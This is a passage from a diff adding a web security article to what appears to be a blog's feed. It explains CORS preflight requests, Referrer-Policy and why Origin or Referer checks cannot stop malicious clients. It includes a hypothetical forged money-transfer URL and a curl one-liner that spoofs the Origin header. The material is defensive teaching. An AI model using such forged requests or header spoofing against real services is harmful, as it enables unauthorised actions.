+leaves us vulnerable if our request would have triggered any side effect on the server
+&mdash; imagine, for example, if our bank would allow to transfer money by simply
+calling the url <code>my-bank.com/transfer?amount=1000&amp;from=me&amp;to=attacker</code>, that would
+be a disaster!</p>
+
+<p>As we&rsquo;ve seen at the beginning of this article, <code>GET</code> requests are supposed to be
+idempotent, but what would happen if we tried triggering a <code>POST</code> request? Luckily,
+I&rsquo;ve included this scenario in the example, so we can try it by navigating to
+<code>http://cors-test:7888/?method=POST</code>:</p>
+
+<p><img class="center" src="/images/wasec/cors-pre.png"></p>
+
+<p>Instead of directly executing our <code>POST</code> request, which could potentially cause
+some serious trouble on the server, the browser sent a &ldquo;preflight&rdquo; request:
+this is nothing but an <code>OPTIONS</code> request to the server, asking it to validate
+whether our origin is allowed. In this case, the server did not respond positively,
+so the browser stops the process, and our <code>POST</code> request never reaches the target.</p>
+
+<p>This tells us a couple things:</p>
+
+<ul>
+<li>CORS is not a simple specification: there are quite a few scenarios to keep
+in mind and you can easily get tangled in the nuances of features such as preflight requests</li>
+<li>never expose APIs that change state via <code>GET</code>: an attacker can trigger those requests
+without a preflight request, meaning there&rsquo;s no protection at all</li>
+</ul>
+
+
+<p>Out of experience, I found myself more comfortable with setting up proxies that
+can forward the request to the right server, all on the backend, rather than using CORS. This means that
+your application running at <code>example.com</code> can setup a proxy at <code>example.com/_proxy/other.com</code>,
+so that all requests falling under <code>_proxy/other.com/*</code> get proxied to <code>other.com</code>.</p>
+
+<p>I will conclude my overview of this feature here but, if you&rsquo;re interested in
+understanding CORS in depth, MDN has a very lengthy article
+that brilliantly covers the whole specification at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">developer.mozilla.org/en-US/docs/Web/HTTP/CORS</a>.</p>
+
+<h2>X-Permitted-Cross-Domain-Policies</h2>
+
+<p>Very much related to CORS, the <code>X-Permitted-Cross-Domain-Policies</code> targets cross-domain
+policies for Adobe products (namely Flash and Acrobat).</p>
+
+<p>I won&rsquo;t go much into the details, as this is a header that targets very specific
+use cases: long story short, Adobe products handle cross-domain request through
+a <code>crossdomain.xml</code> file in the root of the domain the request is targeting, and
+the <code>X-Permitted-Cross-Domain-Policies</code> defines policies to access this file.</p>
+
+<p>Sounds complicated? I would simply suggest to add an
+<code>X-Permitted-Cross-Domain-Policies: none</code> and ignore clients wanting to make cross-domain
+requests with Flash.</p>
+
+<h2>Referrer-Policy</h2>
+
+<p>At the beginning of our careers, we all probably made the same mistake: use the <code>Referer</code>
+header to implement a security restriction on our website. If the header contains
+a specific URL in a whitelist we define, we&rsquo;re going to let users through.</p>
+
+<p>Ok, maybe that wasn&rsquo;t every one of us &mdash; but I damn sure made this mistake back then:
+trusting the <code>Referer</code> header to give us reliable information on the origin the user
+comes from. The header was really useful until we figured that sending
+this information to sites could pose a potential threat to our users' privacy.</p>
+
+<p>Born at the beginning of 2017 and currently supported by all major browsers, the
+<code>Referrer-Policy</code> header can be used to mitigate these privacy concerns by telling
+the browser that it should only mask the URL in the <code>Referer</code> header, or omit it
+altogether.</p>
+
+<p>Some of the most common values the <code>Referrer-Policy</code> can take are:</p>
+
+<ul>
+<li><code>no-referrer</code>: the <code>Referer</code> header will be entirely omitted</li>
+<li><code>origin</code>: turns <code>https://example.com/private-page</code> to <code>https://example.com/</code></li>
+<li><code>same-origin</code>: send the <code>Referer</code> to same-site origins but omit it for anyone else</li>
+</ul>
+
+
+<p>It&rsquo;s worth to note that there are a lot more variations of the <code>Referrer-Policy</code>
+(<code>strict-origin</code>, <code>no-referrer-when-downgrade</code>, etc) but the ones I mentioned above
+are probably going to cover most of your use cases. If you wish to better understand
+each and every variation you can use, I would recommend heading to the
+<a href="https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#rp">OWASP dedicated page</a>.</p>
+
+<p>The <code>Origin</code> header is very similar to the <code>Referer</code>, as it&rsquo;s sent by the browser
+in cross-domain requests to make sure the caller is allowed to access a resource
+on a different domain. The <code>Origin</code> header is controlled by the browser, so there&rsquo;s no
+way malicious users can tamper with it. You might be tempted to use it as a
+firewall for your web application: if the <code>Origin</code> is in our whitelist,
+let the request go through.</p>
+
+<p>One thing to consider, though, is that other HTTP clients such as cURL can present
+their own origin: a simple <code>curl -H "Origin: example.com" api.example.com</code> will
+render all origin-based firewall rules inefficient&hellip;   &hellip;and that is why you
+cannot rely on the <code>Origin</code> (or the <code>Referer</code>, as we&rsquo;ve just seen) to build
+a firewall to keep malicious clients away.</p>
+
+<h2>Testing your security posture</h2>
+
+<p>I want to conclude this article with a reference to <a href="https://securityheaders.com">securityheaders.com</a>,
+an incredibly useful website that allows you to verify that your web application
+has the right security-related headers in place &mdash; after you submit a URL, you
+will be handed a grade and a breakdown, header by header. Here&rsquo;s an <a href="https://securityheaders.com/?q=https%3A%2F%2Ffacebook.com&amp;followRedirects=on">example report
+for facebook.com</a>:</p>
+
+<p><img class="center" src="/images/wasec/security-headers.png"></p>
+
+<p>If in doubt on where to start, securityheaders.com is a great place to get a first
+assessment.</p>
+
+<h2>Stateful <a href="HTTP:">HTTP:</a> managing sessions with cookies</h2>
+
+<p>This article should have introduced us to a few interesting HTTP headers,
+allowing us to understand how they harden our web
+applications through protocol-specific features, together with a bit of help
+from mainstream browsers.</p>
+
+<p>In the next post, we will delve deep into one of the most misunderstood features
+of the HTTP protocol: cookies.</p>
+
+<p>Born to bring some sort of state to the otherwise stateless HTTP, cookies have
+probably been used (and misused) by each and everyone of us in order to support
+sessions in our web apps: whenever there&rsquo;s some state we&rsquo;d like to persist it&rsquo;s
+always easy to say &ldquo;store it in a cookie&rdquo;. As we will see, cookies are not always
+the safest of vaults and must be treated carefully when dealing with sensitive
+information.</p>
+
+<p>
+
+
+
+<div class="series_nav">
+  
+  
+</div>
+</p>
+]]></content>
+  </entry>
+  
+</feed>
